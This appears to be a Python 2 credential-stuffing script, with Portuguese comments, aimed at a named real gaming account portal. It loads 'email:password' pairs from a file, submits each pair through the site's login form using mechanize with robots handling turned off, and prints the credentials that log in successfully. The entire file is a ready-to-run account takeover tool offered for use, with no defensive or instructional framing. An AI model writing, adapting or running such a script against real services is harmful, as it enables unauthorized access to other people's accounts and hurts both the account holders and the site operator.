#author: Guilherme Oliveira
import mechanize

def readFile(path):
    file = open(path,'r')
    content = file.read()
    return content

arrayLogins = readFile('logins.txt').split('\n') #arquivo com emails e senhas

url = "https://minhaconta.levelupgames.com.br/web"
browser = mechanize.Browser()
browser.set_handle_equiv(True)
browser.set_handle_redirect(True)
browser.set_handle_referer(True)
browser.set_handle_robots(False)
    
browser.open(url)

for i in range(0, len(arrayLogins)):
    login = (arrayLogins[i].split(':'))[0]
    pw = (arrayLogins[i].split(':'))[1]
    
    #browser.select_form('LoginForm') #selecionar pelo nome do form
    browser.select_form(nr=0) #primeiro formulario da pag se for sem nome

    #preencher
    browser.form['Username'] = login
    browser.form['Password'] = pw
    #submit
    browser.method = "POST"
    resp = browser.submit()

    if resp.geturl() == "https://minhaconta.levelupgames.com.br/web/minha-conta":
        print "CORRECT! ",login," ", pw
        browser.back();
    else:
        print "WRONG :-("
        browser.back();

